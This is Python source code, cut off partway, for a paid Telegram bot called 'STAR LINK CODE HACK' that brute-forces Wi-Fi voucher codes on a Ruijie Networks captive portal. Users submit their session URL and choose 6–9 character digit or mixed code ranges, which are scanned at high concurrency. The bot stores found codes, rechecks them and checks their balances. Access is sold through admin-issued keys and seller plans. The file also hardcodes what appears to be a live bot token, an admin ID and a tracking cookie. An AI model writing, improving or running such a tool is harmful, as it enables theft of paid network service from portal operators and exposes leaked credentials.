import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, aiofiles
from telebot.async_telebot import AsyncTeleBot
from telebot import types
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from urllib.parse import urlparse, parse_qs
import price
import rust_scanner

# ------------------------- CONFIG -------------------------
BOT_TOKEN = "8395017924:AAEpypz5C7_JzuW5Hzgyupae5qHfVhFxXWc"
ADMIN_ID = "6182661436"
AUTH_FILE = "auth_list.json"
RESULT_FILE = "result.json"
SELLERS_FILE = "sellers.json"
ADMIN_CONTACT = "Admin_Name"
A_C = "Admin_Channel"
PRICE = "8800"
# ---------------------------------------------------------

bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}        
limited_messages = {}
limited_texts = {}
session = None
_connector = None
_http_session = None
CONCURRENCY = 400   
_voucher_sem = None
_start_time = time.monotonic()
found_count = {}
retry_count = {}
current_scan_type = {}

auth_list = {}
result = {}
sellers = {}
auth_lock = asyncio.Lock()
result_lock = asyncio.Lock()
sellers_lock = asyncio.Lock()
SUCCESS_CODE = asyncio.Queue()

def format_time(total_minutes):
    if total_minutes is None:
        return "Unavailable"
    if isinstance(total_minutes, str) and total_minutes.strip().lower() in {"unknown", "n/a", "na", ""}:
        return "Unavailable"
    try:
        minutes = int(total_minutes)
        if minutes < 0:
            return "⛔ Expired"
        if minutes == 0:
            return "0 minutes"
        days = minutes // 1440
        hours = (minutes % 1440) // 60
        mins = minutes % 60
        parts = []
        if days > 0: parts.append(f"{days} day{'s' if days > 1 else ''}")
        if hours > 0: parts.append(f"{hours} hour{'s' if hours > 1 else ''}")
        if mins > 0: parts.append(f"{mins} minute{'s' if mins > 1 else ''}")
        return " ".join(parts) if parts else "0 minutes"
    except:
        return "Unknown"

async def fetch_voucher_balance(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    try:
        url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}'
        async with session.get(url, headers=headers) as req:
            respond = await req.json()
            return respond.get('result', {}) or {}
    except Exception:
        return {}

async def load_auth_list():
    global auth_list
    try:
        async with aiofiles.open(AUTH_FILE, 'r') as f:
            auth_list = json.loads(await f.read())
    except FileNotFoundError:
        auth_list = {}
        await save_auth_list()
    except:
        auth_list = {}

async def save_auth_list():
    async with auth_lock:
        async with aiofiles.open(AUTH_FILE, 'w') as f:
            await f.write(json.dumps(auth_list, indent=2))

async def load_result():
    global result
    try:
        async with aiofiles.open(RESULT_FILE, 'r') as f:
            result = json.loads(await f.read())
    except FileNotFoundError:
        result = {}
        await save_result()
    except:
        result = {}

async def save_result():
    async with result_lock:
        async with aiofiles.open(RESULT_FILE, 'w') as f:
            await f.write(json.dumps(result, indent=2))

async def load_sellers():
    global sellers
    try:
        async with aiofiles.open(SELLERS_FILE, 'r') as f:
            data = json.loads(await f.read())
            sellers = data.get("sellers", {})
    except FileNotFoundError:
        sellers = {}
        await save_sellers()
    except:
        sellers = {}

async def save_sellers():
    async with sellers_lock:
        async with aiofiles.open(SELLERS_FILE, 'w') as f:
            await f.write(json.dumps({"sellers": sellers}, indent=2))

def check_expiration(expires_at):
    if expires_at == "9999-12-31T23:59:59Z":
        return True
    try:
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp_time
    except:
        return False

def is_authorized(chat_id):
    chat_id_str = str(chat_id)
    if chat_id_str == ADMIN_ID:
        return True
    if chat_id_str in sellers:
        seller_data = sellers[chat_id_str]
        expires_at = seller_data.get("expires_at", "2000-01-01T00:00:00Z")
        return check_expiration(expires_at)
    return False

def unauthorized_message():
    return f"❌ သင့်အနေနဲ့ ခွင့်ပြုချက်မရှိပါ။ ကျေးဇူးပြု၍ Admin Channel {A_C} သို့ ဝင်ရောက်ပါ။ (သို့မဟုတ်) Admin  {ADMIN_CONTACT} ကို ဆက်သွယ်ပါ။\n\n"
    f"{PRICE}"

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(year=yyyy, month=MM, day=dd, hour=hh, minute=mm, second=0, tzinfo=timezone.utc)
        return datetime.now(timezone.utc) < expiration_dt
    except:
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "15d": timedelta(days=15),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_remaining_time(expires_at):
    if expires_at == "9999-12-31T23:59:59Z":
        return "Unlimited"
    try:
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        now = datetime.now(timezone.utc)
        if exp_time <= now:
            return "Expired"
        diff = exp_time - now
        days = diff.days
        hours, rem = divmod(diff.seconds, 3600)
        minutes = rem // 60
        if days > 0:
            return f"{days}d {hours}h {minutes}m"
        else:
            return f"{hours}h {minutes}m"
    except:
        return "Unknown"

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def get_user_info(user_id):
    try:
        user = await bot.get_chat(user_id)
        name = user.first_name or "Unknown"
        if user.last_name:
            name += f" {user.last_name}"
        username = user.username or "None"
        return {"name": name, "username": username, "id": user_id}
    except Exception as e:
        print(f"Error getting user info: {e}")
        return {"name": "Unknown", "username": "None", "id": user_id}

async def send_main_menu(message):
    user_info = await get_user_info(message.chat.id)
    user_name = user_info["name"]
    user_id = user_info["id"]
    
    status_text = ""
    limit_text = ""
    
    if str(message.chat.id) == ADMIN_ID:
        status_text = "♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။"
        limit_text = "♾️ Code Limit: Unlimited (Admin)"
    elif is_authorized(message.chat.id):
        status_text = "♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။"
        limit_text = "♾️ Code Limit: Unlimited"
    elif str(message.chat.id) in auth_list:
        key_data = auth_list[str(message.chat.id)]
        limit = key_data.get("limit", "unlimited") if isinstance(key_data, dict) else "unlimited"
        found_count = len(result.get(str(message.chat.id), []))
        if limit == "unlimited":
            limit_text = f"♾️ Code Limit: Unlimited\n📊 Used: {found_count} codes"
        else:
            limit_num = int(limit)
            remaining = max(0, limit_num - found_count)
            limit_text = f"🔢 Code Limit: {limit}\n📊 Used: {found_count} codes\n✅ Remaining: {remaining} codes"
        status_text = "✅ Paid User ဖြစ်ပါသည်။"
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🚀 Start Scan", callback_data="scan_type_menu"),
        types.InlineKeyboardButton("📝 Input URL", callback_data="input_url"),
        types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan"),
        types.InlineKeyboardButton("📄 My Result", callback_data="result"),
        types.InlineKeyboardButton("📊 Status", callback_data="status"),
        types.InlineKeyboardButton("📖 Help", callback_data="help")
    )
    if str(message.chat.id) == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("🛠️ Admin Panel", callback_data="admin_menu"))
    
    welcome_text = (
        f"✨ STAR LINK CODE HACK ✨\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 NAME: {user_name}\n"
        f"🆔 USER ID: {user_id}\n"
        f"🎉 မင်္ဂလာပါခင်ဗျာ!\n"
        f"✅ သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။\n"
        f"{status_text}\n"
        f"{limit_text}\n"
        f"🔄 Proxy Status: ON\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"
    )
    await bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)

async def send_admin_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🛠️ Genkey", callback_data="genkey_menu"),
        types.InlineKeyboardButton("🛒 Add Seller", callback_data="seller_menu"),
        types.InlineKeyboardButton("📋 List Keys", callback_data="listkeys"),
        types.InlineKeyboardButton("📊 Status", callback_data="status"),
        types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
    )
    await bot.edit_message_text("🛠️ **Admin Panel**\n\nSelect an option:", chat_id=message.chat.id, message_id=message.message_id, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):
    data = call.data
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    
    if data == "main_menu":
        await send_main_menu(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    elif data == "status":
        await handle_status(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    elif data == "listkeys":
        await handle_listkeys(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    elif data == "scan_type_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔢 6 Digit Only", callback_data="scan_type_6"),
            types.InlineKeyboardButton("🔢 7 Digit Only", callback_data="scan_type_7"),
            types.InlineKeyboardButton("🔢 8 Digit Only", callback_data="scan_type_8"),
            types.InlineKeyboardButton("🔢 9 Digit Only", callback_data="scan_type_9"),
            types.InlineKeyboardButton("🔤 All Mix (6)", callback_data="scan_type_all6"),
            types.InlineKeyboardButton("🔤 All Mix (7)", callback_data="scan_type_all7"),
            types.InlineKeyboardButton("🔤 All Mix (8)", callback_data="scan_type_all8"),
            types.InlineKeyboardButton("🔤 All Mix (9)", callback_data="scan_type_all9"),
            types.InlineKeyboardButton("abc Only (6)", callback_data="scan_type_abc6"),
            types.InlineKeyboardButton("abc Only (7)", callback_data="scan_type_abc7"),
            types.InlineKeyboardButton("abc Only (8)", callback_data="scan_type_abc8"),
            types.InlineKeyboardButton("abc Only (9)", callback_data="scan_type_abc9"),
            types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
        )
        await bot.edit_message_text(
            "🚀 **Choose Scan Type**\n\nSelect the type you want to use:",
            chat_id=chat_id,
            message_id=message_id,
            parse_mode="Markdown",
            reply_markup=markup
        )
        await bot.answer_callback_query(call.id)
        return
    
    elif data in {"scan_type_6", "scan_type_7", "scan_type_8", "scan_type_9", "scan_type_all6", "scan_type_all7", "scan_type_all8", "scan_type_all9", "scan_type_abc6", "scan_type_abc7", "scan_type_abc8", "scan_type_abc9"}:
        mode_map = {
            "scan_type_6": "6",
            "scan_type_7": "7",
            "scan_type_8": "8",
            "scan_type_9": "9",
            "scan_type_all6": "all6",
            "scan_type_all7": "all7",
            "scan_type_all8": "all8",
            "scan_type_all9": "all9",
                    "scan_type_abc6": "abc6",
                    "scan_type_abc7": "abc7",
                    "scan_type_abc8": "abc8",
                    "scan_type_abc9": "abc9"
        }
        mode = mode_map[data]
        current_scan_type[chat_id] = mode
        await trigger_scan(call.message, mode)
        await bot.answer_callback_query(call.id)
        return
    
    elif data == "input_url":
        await bot.edit_message_text(
            "📝 **Please send your Session URL**\n\n(Example: `/input https://portal-as.ruijienetworks.com/api/...`)", 
            chat_id=chat_id, 
            message_id=message_id, 
            parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return
    
    elif data == "stop_scan":
        await stop_scan(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    elif data == "result":
        await handle_result(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    elif data == "help":
        await help_command(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    elif data == "admin_menu":
        await send_admin_menu(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    elif data == "genkey_menu":
        await bot.edit_message_text(
            "📝 **To generate key, use:**\n\n`/genkey <plan> <user_id> <limit>`\n\nPlans: `30m`, `1h`, `1d`, `7d`, `1m`, `1y`, `unlimited`\n\nLimits: `unlimited` သို့မဟုတ် ကြိုက်သလောက် ဂဏန်း (ဥပမာ- 25, 100, 500)", 
            chat_id=chat_id, 
            message_id=message_id, 
            parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return
    
    elif data == "seller_menu":
        await bot.edit_message_text(
            "📝 **To add seller, use:**\n\n`/addseller <user_id> <plan>`", 
            chat_id=chat_id, 
            message_id=message_id, 
            parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

@bot.message_handler(commands=['start'])
async def start(message):
    await handle_key(message)

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve, auth_list
    chat_id = str(message.chat.id)

    if is_authorized(chat_id):
        approve[message.chat.id] = True
        if message.chat.id not in user_data:
            user_data[message.chat.id] = {}
        await bot.reply_to(message, "✅ Admin/Seller approved.")
        await send_main_menu(message)
        return

    if chat_id in auth_list:
        valid = check_key_expiration(auth_list[chat_id])
        if valid:
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။")
            await send_main_menu(message)
        else:
            approve[message.chat.id] = False
            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        user_info = await get_user_info(message.chat.id)
        user_name = user_info["name"]
        user_id = user_info["id"]
        
        await bot.reply_to(message, 
            f"❌ သင့်အနေနဲ့ Key မရှိသေးပါ။\n\n"
            f"👤 NAME: {user_name}\n"
            f"🆔 USER ID: {user_id}\n\n"
            f"ကျေးဇူးပြု၍ Admin Channel {A_C} သို့ ဝင်ရောက်ပါ။ (သို့မဟုတ်) Admin {ADMIN_CONTACT} ကို ဆက်သွယ်ပါ။\n\n"
            f"{PRICE}",
            parse_mode="Markdown"
        )

@bot.message_handler(commands=['help'])
async def help_command(message):
    help_text = (
        "🤖 **My_bypss_bot Command List**\n\n"
        "🔹 **User Commands** (key required unless Admin/Seller):\n"
        "  `/key` – သင်၏ key ကို ထည့်သွင်းရန်\n"
        "  `/input <session_url>` – Session URL ထည့်ရန်\n"
        "  `/scan <6|7|8|9|all6|all7|all8|all9>` – Code ရှာဖွေရန်\n"
        "  `/stop` – လက်ရှိ scan ကို ရပ်တန့်ရန်\n"
        "  `/result` – သင့်တွေ့ရှိထားသော success code များကို ကြည့်ရန်\n"
        "  `/recheck` – သင့် success code များကို ပြန်လည်စစ်ဆေးရန်\n"
        "  `/checkvoucher` – Voucher code များ၏ အခြေအနေကို စစ်ဆေးရန်\n"
        "  `/mytime` – သင်၏ ကျန်အချိန်ကို ကြည့်ရန် (Seller များအတွက်)\n"
        "  `/mylimit` – သင်၏ code limit ကို ကြည့်ရန်\n\n"
        "🔹 **Admin/Seller Commands** (ဤသူများသာ သုံးနိုင်):\n"
        "  `/genkey <plan> <user_id> <limit>` – Key ထုတ်ပေးရန် (plan: 30m,1h,1d,7d,1m,1y,unlimited / limit: unlimited သို့မဟုတ် ကြိုက်သလောက် ဂဏန်း)\n"
        "  `/delkey <user_id>` – Key ဖျက်ရန်\n"
        "  `/listkeys` – မှတ်ပုံတင်ထားသော Key စာရင်းကို ကြည့်ရန်\n"
        "  `/status` – Bot အခြေအနေကို ကြည့်ရန်\n\n"
        "🔹 **Admin Only** (အဓိက Admin မှသာ):\n"
        "  `/addseller <user_id> <plan>` – Seller အဖြစ် ထည့်သွင်းရန်\n"
        "  `/removeseller <user_id>` – Seller ကို ဖယ်ရှားရန်\n"
        "  `/listsellers` – Seller စာရင်းနှင့် ကျန်အချိန်ကို ကြည့်ရန်\n"
        "  `/broadcast <message>` – Seller အားလုံးသို့ မက်ဆေ့ချ်ပို့ရန်\n\n"
        "📌 **Scan Types**:\n"
        "  `6` – ဂဏန်း 6 လုံး (000000-999999)\n"
        "  `7` – ဂဏန်း 7 လုံး (0000000-9999999)\n"
        "  `8` – ဂဏန်း 8 လုံး (00000000-99999999)\n"
        "  `9` – ဂဏန်း 9 လုံး (000000000-999999999)\n"
        "  `all6` – အက္ခရာ+ဂဏန်း 6 လုံး (a-z,0-9)\n"
        "  `all7` – အက္ခရာ+ဂဏန်း 7 လုံး\n"
        "  `all8` – အက္ခရာ+ဂဏန်း 8 လုံး\n"
        "  `all9` – အက္ခရာ+ဂဏန်း 9 လုံး"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['mytime'])
async def mytime(message):
    chat_id = str(message.chat.id)
    if chat_id in sellers:
        seller_data = sellers[chat_id]
        expires_at = seller_data.get("expires_at", "2000-01-01T00:00:00Z")
        plan = seller_data.get("plan", "Unknown")
        remaining = get_remaining_time(expires_at)
        await bot.reply_to(message, f"📅 **Your Seller Info**\nPlan: {plan}\nRemaining Time: {remaining}", parse_mode="Markdown")
    else:
        await bot.reply_to(message, "You are not a seller.")

@bot.message_handler(commands=['mylimit'])
async def mylimit(message):
    chat_id = str(message.chat.id)
    
    if chat_id in auth_list:
        key_data = auth_list[chat_id]
        limit = key_data.get("limit", "unlimited") if isinstance(key_data, dict) else "unlimited"
        plan = key_data.get("plan", "unknown") if isinstance(key_data, dict) else "unknown"
        expires = key_data.get("expires_at", "unknown") if isinstance(key_data, dict) else "unknown"
        used_count = len(result.get(chat_id, []))
        if limit == "unlimited":
            limit_text = "♾️ Unlimited"
            remaining_text = "♾️ Unlimited"
        else:
            limit_num = int(limit)
            remaining = max(0, limit_num - used_count)
            limit_text = str(limit)
            remaining_text = str(remaining)
        remaining_time = get_remaining_time(expires)
        await bot.reply_to(message, 
            f"📊 **Your Key Info**\n\n"
            f"📋 Plan: {plan}\n"
            f"⏰ Remaining Time: {remaining_time}\n"
            f"🔢 Code Limit: {limit_text}\n"
            f"📊 Used: {used_count} codes\n"
            f"✅ Remaining: {remaining_text} codes",
            parse_mode="Markdown"
        )
    elif is_authorized(message.chat.id):
        await bot.reply_to(message, "♾️ You have Unlimited access (Admin/Seller)")
    else:
        await bot.reply_to(message, "❌ You don't have a valid key. Please contact Admin.")

@bot.message_handler(commands=['addseller'])
async def add_seller(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, unauthorized_message())
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/addseller <user_id> <plan>\nPlans: 30m,1h,1d,7d,1m,1y,unlimited")
            return
        user_id = args[1]
        plan = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "Invalid plan. Use: 30m,1h,1d,7d,1m,1y,unlimited")
            return
        sellers[user_id] = {"expires_at": expiry, "plan": plan}
        await save_sellers()
        await bot.reply_to(message, f"✅ Seller added successfully!\n\nUser ID: {user_id}\nPlan: {plan}\nExpires: {expiry}")
    except Exception as e:
        print(f"Error at addseller: {e}")

@bot.message_handler(commands=['removeseller'])
async def remove_seller(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, unauthorized_message())
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/removeseller <user_id>")
            return
        user_id = args[1]
        if user_id in sellers:
            del sellers[user_id]
            await save_sellers()
            await bot.reply_to(message, f"✅ Seller removed successfully!\nUser ID: {user_id}")
        else:
            await bot.reply_to(message, f"User ID {user_id} is not a seller.")
    except Exception as e:
        print(f"Error at removeseller: {e}")

@bot.message_handler(commands=['listsellers'])
async def list_sellers(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, unauthorized_message())
        return
    if not sellers:
        await bot.reply_to(message, "No sellers registered.")
        return
    lines = []
    for uid, data in sellers.items():
        plan = data.get("plan", "Unknown")
        expires_at = data.get("expires_at", "N/A")
        remaining = get_remaining_time(expires_at)
        lines.append(f"👤 {uid}\n   Plan: {plan}\n   Remaining: {remaining}")
    text = f"📋 **Sellers List ({len(sellers)})**\n\n" + "\n\n".join(lines)
    if len(text) > 4096:
        for i in range(0, len(text), 4096):
            await bot.send_message(message.chat.id, text[i:i+4096], parse_mode="Markdown")
    else:
        await bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
async def broadcast(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, unauthorized_message())
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/broadcast <message>")
        return

    msg = args[1]

    # Seller + Key User နှစ်ခုလုံးကို ပေါင်းမယ်
    recipient_ids = set(sellers.keys()) | set(auth_list.keys())

    if not recipient_ids:
        await bot.reply_to(message, "No users to broadcast.")
        return

    sent = 0
    failed = 0

    for uid in recipient_ids:
        try:
            await bot.send_message(
                int(uid),
                f"📢 Admin Message:\n{msg}"
            )
            sent += 1
            await asyncio.sleep(0)

        except Exception:
            failed += 1

    await bot.reply_to(
        message,
        f"✅ Broadcast completed!\n\n"
        f"📨 Sent: {sent}\n"
        f"👥 Total: {len(recipient_ids)}\n\n"
        f"❌ Failed: {failed}"
        
    )

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if not is_authorized(message.chat.id):
        await bot.reply_to(message, unauthorized_message())
        return
    await handle_listkeys(message)

async def handle_listkeys(message):
    if not is_authorized(message.chat.id):
        await bot.reply_to(message, unauthorized_message())
        return
    if not auth_list:
        await bot.reply_to(message, "Registered key မရှိသေးပါ။")
        return
    lines = []
    for uid, data in auth_list.items():
        if isinstance(data, dict):
            expires = data.get("expires_at", "unknown")
            plan = data.get("plan", "unknown")
            limit = data.get("limit", "unlimited")
            if expires == "9999-12-31T23:59:59Z":
                expires_str = "Unlimited"
            else:
                try:
                    exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                    now = datetime.now(timezone.utc)
                    if exp_dt < now:
                        expires_str = "Expired"
                    else:
                        diff = exp_dt - now
                        days = diff.days
                        hours, rem = divmod(diff.seconds, 3600)
                        minutes = rem // 60
                        expires_str = f"{days}d {hours}h {minutes}m left"
                except:
                    expires_str = expires
        else:
            plan = "old"
            expires_str = str(data)
            limit = "unlimited"
        lines.append(f"👤 {uid}\n   Plan: {plan}\n   Limit: {limit}\n   Expires: {expires_str}")
    text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
    if len(text) > 4096:
        for i in range(0, len(text), 4096):
            await bot.send_message(message.chat.id, text[i:i+4096])
    else:
        await bot.reply_to(message, text)

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_authorized(message.chat.id):
        await bot.reply_to(message, unauthorized_message())
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        await save_auth_list()
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(message, f"✅ Key Deleted\n\nUSER ID : {user_id}")
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_authorized(message.chat.id):
        await bot.reply_to(message, unauthorized_message())
        return
    try:
        args = message.text.split()
        if len(args) < 4:
            await bot.reply_to(message, "Usage:\n/genkey <plan> <user_id> <limit>\n\nPlans: 30m,1h,1d,7d,1m,1y,unlimited\nLimits: unlimited သို့မဟုတ် ကြိုက်သလောက် ဂဏန်း (ဥပမာ- 25, 100, 500)")
            return
        plan = args[1]
        user_id = args[2]
        limit = args[3]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "Invalid plan!\nPlans: 30m,1h,1d,7d,1m,1y,unlimited")
            return
        if limit != "unlimited":
            try:
                limit_num = int(limit)
                if limit_num < 1:
                    raise ValueError
            except ValueError:
                await bot.reply_to(message, "Invalid limit!\nLimit သည် ဂဏန်းဖြစ်ရပါမည် (ဥပမာ- 25, 100, 500) သို့မဟုတ် `unlimited`")
                return
        auth_list[user_id] = {"expires_at": expiry, "plan": plan, "limit": limit}
        await save_auth_list()
        await bot.reply_to(
            message,
            f"✅ Key Generated\n\n"
            f"USER ID : {user_id}\n"
            f"PLAN : {plan}\n"
            f"LIMIT : {limit}\n"
            f"EXPIRES : {expiry}"
        )
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    chat_id = str(message.chat.id)
    if is_authorized(chat_id) or chat_id in auth_list:
        if chat_id in result and result[chat_id]:
            codes = "\n".join(result[chat_id])
            await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
        else:
            await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။")
    else:
        await bot.reply_to(message, unauthorized_message())

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if not is_authorized(chat_id):
        await bot.reply_to(message, unauthorized_message())
        return
    if chat_id not in user_data:
        await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    if "session_url" not in user_data[chat_id]:
        await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return
    chat_id_str = str(chat_id)
    if chat_id_str in result and result[chat_id_str]:
        codes = result[chat_id_str]
        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
        session_url_recheck = user_data[chat_id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check(
                session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message
            )
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
        await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
        await save_rechecked_codes(chat_id_str, recheck_list)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")

async def save_rechecked_codes(chat_id_str, recheck_list):
    global result
    result[chat_id_str] = recheck_list
    await save_result()

async def check_session_url(session_url):
    parsed = urlparse(session_url)
    query_params = parse_qs(parsed.query)
    if 'sessionId' in query_params and query_params['sessionId'][0]:
        return True
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            final_url = str(response.url)
            if "sessionId" in final_url:
                return True
            return False
    except:
        return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/input your_session_url")
        return
    url = args[1]
    if message.chat.id in user_data:
        await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
        if await check_session_url(session_url=url):
            user_data[message.chat.id]['session_url'] = url
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("🔢 6 Digit Only", callback_data="scan_type_6"),
                types.InlineKeyboardButton("🔢 7 Digit Only", callback_data="scan_type_7"),
                types.InlineKeyboardButton("🔢 8 Digit Only", callback_data="scan_type_8"),
                types.InlineKeyboardButton("🔢 9 Digit Only", callback_data="scan_type_9"),
                types.InlineKeyboardButton("🔤 All Mix (6)", callback_data="scan_type_all6"),
                types.InlineKeyboardButton("🔤 All Mix (7)", callback_data="scan_type_all7"),
                types.InlineKeyboardButton("🔤 All Mix (8)", callback_data="scan_type_all8"),
